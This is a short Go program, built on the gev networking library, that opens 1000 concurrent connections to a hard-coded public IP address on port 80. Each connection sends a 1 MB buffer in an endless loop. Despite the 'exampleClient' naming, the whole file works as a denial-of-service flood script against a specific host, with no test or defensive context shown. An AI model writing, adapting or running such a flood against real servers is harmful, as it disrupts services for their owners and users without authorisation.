package main

import (
	"github.com/Allenxuxu/gev"
	"github.com/Allenxuxu/gev/log"
	"sync"
)

type exampleClient struct {
	data []byte
}

func (s *exampleClient) OnConnect(c *gev.Connection) {
	log.Info("OnConnect")
	c.Send(s.data)
}

func (s *exampleClient) OnMessage(c *gev.Connection, data []byte) {
	log.Info("OnMessage")
}

func (s *exampleClient) OnClose(c *gev.Connection) {
	log.Info("OnClose")
}

func main() {
	data := make([]byte, 1024*1024) // 1 MB of data
	var wg sync.WaitGroup

	for i := 0; i < 1000; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client, err := gev.Dial("193.228.196.49:80", &exampleClient{data: data})
			if err != nil {
				log.Fatalln("Dial failed:", err)
			}

			for {
				client.Send(data)
			}
		}()
	}

	wg.Wait()
}
